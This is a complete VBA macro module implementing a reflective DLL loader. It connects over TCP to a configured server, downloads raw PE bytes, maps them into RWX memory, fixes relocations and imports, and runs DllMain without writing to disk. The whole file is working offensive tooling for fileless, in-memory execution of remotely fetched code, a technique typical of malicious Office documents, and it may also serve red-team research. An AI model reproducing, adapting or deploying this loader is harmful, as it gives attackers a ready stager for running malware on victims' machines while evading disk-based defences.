Option Explicit

' Reflective DLL Loader — downloads a DLL over TCP and manually maps it in-process.
' No file is written to disk. The DLL server sends raw PE bytes on connect.
' Standalone — all declares inline. Paste into a standard module.

' ===================== CONFIG =====================

Private Const SERVER_HOST As String = "127.0.0.1"
Private Const SERVER_PORT As Long = 2843

' ===================== CONSTANTS =====================

Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Const AF_INET As Long = 2
Private Const SOCK_STREAM As Long = 1
Private Const IPPROTO_TCP As Long = 6
Private Const INVALID_SOCKET As LongPtr = -1
Private Const SOCKET_ERROR As Long = -1

Private Const IMAGE_DOS_SIGNATURE As Integer = &H5A4D
Private Const IMAGE_NT_SIGNATURE As Long = &H4550

#If Win64 Then
    Private Const PTR_SIZE As Long = 8
    Private Const OPT_IMAGE_BASE As Long = 24
    Private Const OPT_DATA_DIR As Long = 112
    Private Const PE_MAGIC As Integer = &H20B
#Else
    Private Const PTR_SIZE As Long = 4
    Private Const OPT_IMAGE_BASE As Long = 28
    Private Const OPT_DATA_DIR As Long = 96
    Private Const PE_MAGIC As Integer = &H10B
#End If

Private Const OPT_ENTRY_POINT As Long = 16
Private Const OPT_SIZE_OF_IMAGE As Long = 56
Private Const OPT_SIZE_OF_HEADERS As Long = 60
Private Const SECTION_HEADER_SIZE As Long = 40
Private Const IMPORT_DESC_SIZE As Long = 20

Private Const DLL_PROCESS_ATTACH As Long = 1
Private Const IMAGE_REL_BASED_DIR64 As Long = 10
Private Const IMAGE_REL_BASED_HIGHLOW As Long = 3

' ===================== TYPES =====================

Private Type WSADATA
    wData(0 To 407) As Byte
End Type

Private Type sockaddr_in
    sin_family As Integer
    sin_port As Integer
    sin_addr As Long
    sin_zero(0 To 7) As Byte
End Type

' ===================== DECLARES =====================

' Kernel32
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualFree Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal dwFreeType As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
Private Declare PtrSafe Function LoadLibraryAPtr Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddressPtr Lib "kernel32" Alias "GetProcAddress" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As LongPtr) As LongPtr
Private Declare PtrSafe Function NtFlushInstructionCache Lib "ntdll" ( _
    ByVal ProcessHandle As LongPtr, ByVal BaseAddress As LongPtr, _
    ByVal Length As LongPtr) As Long

' Winsock
Private Declare PtrSafe Function WSAStartup Lib "ws2_32" ( _
    ByVal wVersionRequested As Long, ByRef lpWSAData As WSADATA) As Long
Private Declare PtrSafe Function ws_socket Lib "ws2_32" Alias "socket" ( _
    ByVal af As Long, ByVal dwType As Long, ByVal protocol As Long) As LongPtr
Private Declare PtrSafe Function ws_connect Lib "ws2_32" Alias "connect" ( _
    ByVal s As LongPtr, ByRef sName As sockaddr_in, ByVal namelen As Long) As Long
Private Declare PtrSafe Function ws_recv Lib "ws2_32" Alias "recv" ( _
    ByVal s As LongPtr, ByVal buf As LongPtr, ByVal bufLen As Long, _
    ByVal flags As Long) As Long
Private Declare PtrSafe Function ws_closesocket Lib "ws2_32" Alias "closesocket" ( _
    ByVal s As LongPtr) As Long
Private Declare PtrSafe Function WSACleanup Lib "ws2_32" () As Long
Private Declare PtrSafe Function ws_htons Lib "ws2_32" Alias "htons" ( _
    ByVal hostshort As Long) As Integer
Private Declare PtrSafe Function inet_addr Lib "ws2_32" ( _
    ByVal cp As String) As Long

' User32 — trampoline for calling DllMain
Private Declare PtrSafe Function CallWindowProcW Lib "user32" ( _
    ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
    ByVal Msg As LongPtr, ByVal wParam As LongPtr, _
    ByVal lParam As LongPtr) As LongPtr

' ===================== MEMORY HELPERS =====================

Private Function RdLong(ByVal addr As LongPtr) As Long
    CopyMemory VarPtr(RdLong), addr, 4
End Function

Private Function RdWord(ByVal addr As LongPtr) As Integer
    CopyMemory VarPtr(RdWord), addr, 2
End Function

Private Function RdPtr(ByVal addr As LongPtr) As LongPtr
    CopyMemory VarPtr(RdPtr), addr, CLngPtr(PTR_SIZE)
End Function

Private Sub WrPtr(ByVal addr As LongPtr, ByVal value As LongPtr)
    CopyMemory addr, VarPtr(value), CLngPtr(PTR_SIZE)
End Sub

' ===================== NETWORK =====================

Private Function DownloadDLL(ByVal host As String, ByVal port As Long) As Byte()
    Dim wsa As WSADATA
    If WSAStartup(&H202, wsa) <> 0 Then
        Debug.Print "[!] WSAStartup failed"
        Exit Function
    End If

    Dim sock As LongPtr
    sock = ws_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    If sock = INVALID_SOCKET Then
        Debug.Print "[!] socket() failed"
        WSACleanup
        Exit Function
    End If

    Dim addr As sockaddr_in
    addr.sin_family = AF_INET
    addr.sin_port = ws_htons(port)
    addr.sin_addr = inet_addr(host)

    If ws_connect(sock, addr, LenB(addr)) = SOCKET_ERROR Then
        Debug.Print "[!] connect() failed"
        ws_closesocket sock
        WSACleanup
        Exit Function
    End If
    Debug.Print "[+] Connected to " & host & ":" & port

    Dim buf(0 To 4095) As Byte
    Dim result() As Byte
    Dim totalLen As Long
    Dim bytesRecv As Long
    ReDim result(0 To 65535)

    Do
        bytesRecv = ws_recv(sock, VarPtr(buf(0)), 4096, 0)
        If bytesRecv <= 0 Then Exit Do

        If totalLen + bytesRecv > UBound(result) + 1 Then
            ReDim Preserve result(0 To (totalLen + bytesRecv) * 2)
        End If
        CopyMemory VarPtr(result(totalLen)), VarPtr(buf(0)), CLngPtr(bytesRecv)
        totalLen = totalLen + bytesRecv
    Loop

    ws_closesocket sock
    WSACleanup

    If totalLen > 0 Then
        ReDim Preserve result(0 To totalLen - 1)
        Debug.Print "[+] Received " & totalLen & " bytes"
        DownloadDLL = result
    Else
        Debug.Print "[!] No data received"
    End If
End Function

' ===================== PE MAPPING =====================

Private Function MapAndExecute(ByRef pe() As Byte) As LongPtr
    Dim raw As LongPtr
    raw = VarPtr(pe(0))

    ' Validate DOS header
    If RdWord(raw) <> IMAGE_DOS_SIGNATURE Then
        Debug.Print "[!] Invalid MZ signature"
        Exit Function
    End If

    Dim e_lfanew As Long
    e_lfanew = RdLong(raw + 60)

    ' Validate NT headers
    Dim ntHdr As LongPtr
    ntHdr = raw + CLngPtr(e_lfanew)

    If RdLong(ntHdr) <> IMAGE_NT_SIGNATURE Then
        Debug.Print "[!] Invalid PE signature"
        Exit Function
    End If

    Dim fileHdr As LongPtr: fileHdr = ntHdr + 4
    Dim numSections As Integer: numSections = RdWord(fileHdr + 2)
    Dim optHdrSize As Integer: optHdrSize = RdWord(fileHdr + 16)
    Dim optHdr As LongPtr: optHdr = fileHdr + 20

    ' Validate PE architecture matches VBA bitness
    If RdWord(optHdr) <> PE_MAGIC Then
        Debug.Print "[!] PE architecture mismatch (wrong bitness)"
        Exit Function
    End If

    Dim entryPointRVA As Long: entryPointRVA = RdLong(optHdr + OPT_ENTRY_POINT)
    Dim imageBase As LongPtr: imageBase = RdPtr(optHdr + OPT_IMAGE_BASE)
    Dim sizeOfImage As Long: sizeOfImage = RdLong(optHdr + OPT_SIZE_OF_IMAGE)
    Dim sizeOfHeaders As Long: sizeOfHeaders = RdLong(optHdr + OPT_SIZE_OF_HEADERS)

    Dim importDirRVA As Long: importDirRVA = RdLong(optHdr + OPT_DATA_DIR + 8)
    Dim relocDirRVA As Long: relocDirRVA = RdLong(optHdr + OPT_DATA_DIR + 40)
    Dim relocDirSize As Long: relocDirSize = RdLong(optHdr + OPT_DATA_DIR + 44)

    Debug.Print "[*] SizeOfImage: " & sizeOfImage & "  Sections: " & numSections

    ' Allocate — try preferred base first, then any address
    Dim allocBase As LongPtr
    allocBase = VirtualAlloc(imageBase, CLngPtr(sizeOfImage), _
                             MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If allocBase = 0 Then
        allocBase = VirtualAlloc(0, CLngPtr(sizeOfImage), _
                                 MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    End If
    If allocBase = 0 Then
        Debug.Print "[!] VirtualAlloc failed"
        Exit Function
    End If
    Debug.Print "[+] Allocated at 0x" & Hex(allocBase)

    ' Copy headers
    CopyMemory allocBase, raw, CLngPtr(sizeOfHeaders)

    ' Copy sections
    Dim secHdr As LongPtr
    secHdr = optHdr + CLngPtr(optHdrSize)

    Dim i As Long
    For i = 0 To numSections - 1
        Dim sh As LongPtr: sh = secHdr + CLngPtr(i * SECTION_HEADER_SIZE)
        Dim secVA As Long: secVA = RdLong(sh + 12)
        Dim secRawSz As Long: secRawSz = RdLong(sh + 16)
        Dim secRawPtr As Long: secRawPtr = RdLong(sh + 20)

        If secRawSz > 0 And secRawPtr > 0 Then
            CopyMemory allocBase + CLngPtr(secVA), raw + CLngPtr(secRawPtr), CLngPtr(secRawSz)
        End If
    Next
    Debug.Print "[+] " & numSections & " sections mapped"

    ' Process relocations
    Dim delta As LongPtr
    delta = allocBase - imageBase

    If delta <> 0 And relocDirRVA <> 0 And relocDirSize <> 0 Then
        ProcessRelocations allocBase, CLngPtr(relocDirRVA), CLngPtr(relocDirSize), delta
        Debug.Print "[+] Relocations applied (delta=0x" & Hex(delta) & ")"
    End If

    ' Process imports
    If importDirRVA <> 0 Then
        ProcessImports allocBase, CLngPtr(importDirRVA)
        Debug.Print "[+] Imports resolved"
    End If

    ' Flush instruction cache
    NtFlushInstructionCache -1, allocBase, CLngPtr(sizeOfImage)

    ' Call DllMain via CallWindowProcW trampoline
    Dim ep As LongPtr
    ep = allocBase + CLngPtr(entryPointRVA)
    Debug.Print "[*] Calling entry point at 0x" & Hex(ep)

    CallWindowProcW ep, allocBase, DLL_PROCESS_ATTACH, 0, 0

    Debug.Print "[+] DllMain returned"
    MapAndExecute = allocBase
End Function

' ===================== RELOCATIONS =====================

Private Sub ProcessRelocations(ByVal base As LongPtr, ByVal relocRVA As LongPtr, _
                                ByVal relocSize As LongPtr, ByVal delta As LongPtr)
    Dim block As LongPtr: block = base + relocRVA
    Dim blockEnd As LongPtr: blockEnd = block + relocSize

    Do While block < blockEnd
        Dim blockVA As Long: blockVA = RdLong(block)
        Dim blockSz As Long: blockSz = RdLong(block + 4)
        If blockSz = 0 Then Exit Do

        Dim numEntries As Long
        numEntries = (blockSz - 8) \ 2

        Dim j As Long
        For j = 0 To numEntries - 1
            Dim lo As Byte, hi As Byte
            CopyMemory VarPtr(lo), block + 8 + CLngPtr(j * 2), 1
            CopyMemory VarPtr(hi), block + 8 + CLngPtr(j * 2) + 1, 1

            Dim rType As Long: rType = (CLng(hi) \ 16) And &HF
            Dim rOffset As Long: rOffset = CLng(lo) Or ((CLng(hi) And &HF) * 256)

            Dim target As LongPtr
            target = base + CLngPtr(blockVA) + CLngPtr(rOffset)

            Select Case rType
                Case IMAGE_REL_BASED_DIR64
                    Dim val64 As LongPtr: val64 = RdPtr(target)
                    WrPtr target, val64 + delta

                Case IMAGE_REL_BASED_HIGHLOW
                    Dim val32 As Long: val32 = RdLong(target)
                    Dim newVal As Long
                    ' delta might overflow Long on 64-bit, but HIGHLOW only applies to 32-bit PEs
                    newVal = val32 + CLng(delta And &HFFFFFFFF)
                    CopyMemory target, VarPtr(newVal), 4

                Case 0 ' IMAGE_REL_BASED_ABSOLUTE — padding, skip
            End Select
        Next

        block = block + CLngPtr(blockSz)
    Loop
End Sub

' ===================== IMPORTS =====================

Private Sub ProcessImports(ByVal base As LongPtr, ByVal importRVA As LongPtr)
    Dim desc As LongPtr: desc = base + importRVA

    Do
        Dim nameRVA As Long: nameRVA = RdLong(desc + 12)
        If nameRVA = 0 Then Exit Do

        Dim hMod As LongPtr
        hMod = LoadLibraryAPtr(base + CLngPtr(nameRVA))
        If hMod = 0 Then GoTo NextDesc

        Dim origThunkRVA As Long: origThunkRVA = RdLong(desc)
        Dim thunkRVA As Long: thunkRVA = RdLong(desc + 16)

        Dim intPtr As LongPtr
        If origThunkRVA <> 0 Then
            intPtr = base + CLngPtr(origThunkRVA)
        Else
            intPtr = base + CLngPtr(thunkRVA)
        End If

        Dim iatPtr As LongPtr: iatPtr = base + CLngPtr(thunkRVA)

        Do
            Dim thunkVal As LongPtr: thunkVal = RdPtr(intPtr)
            If thunkVal = 0 Then Exit Do

            Dim funcAddr As LongPtr

            ' Check ordinal flag (top bit of high byte)
            Dim hiByte As Byte
            CopyMemory VarPtr(hiByte), intPtr + CLngPtr(PTR_SIZE - 1), 1

            If (hiByte And &H80) <> 0 Then
                ' Ordinal import — low 16 bits
                funcAddr = GetProcAddressPtr(hMod, thunkVal And CLngPtr(&HFFFF&))
            Else
                ' Named import — thunk points to IMAGE_IMPORT_BY_NAME (hint + name)
                Dim hintNameRVA As Long: hintNameRVA = RdLong(intPtr)
                funcAddr = GetProcAddressPtr(hMod, base + CLngPtr(hintNameRVA) + 2)
            End If

            WrPtr iatPtr, funcAddr

            intPtr = intPtr + CLngPtr(PTR_SIZE)
            iatPtr = iatPtr + CLngPtr(PTR_SIZE)
        Loop

NextDesc:
        desc = desc + IMPORT_DESC_SIZE
    Loop
End Sub

' ===================== ENTRY POINT =====================

Public Sub Run()
    Debug.Print "=== Reflective DLL Loader (VBA) ==="
    Debug.Print "[*] Target: " & SERVER_HOST & ":" & SERVER_PORT

    Dim pe() As Byte
    pe = DownloadDLL(SERVER_HOST, SERVER_PORT)

    Dim sz As Long
    On Error Resume Next
    sz = UBound(pe) + 1
    On Error GoTo 0

    If sz = 0 Then
        MsgBox "Download failed — is DllServer running?", vbExclamation
        Exit Sub
    End If

    Dim baseAddr As LongPtr
    baseAddr = MapAndExecute(pe)

    If baseAddr = 0 Then
        MsgBox "Mapping failed — check Immediate Window (Ctrl+G)", vbExclamation
    Else
        Debug.Print "[+] DLL mapped at 0x" & Hex(baseAddr)
    End If

    Debug.Print "=== Done ==="
End Sub
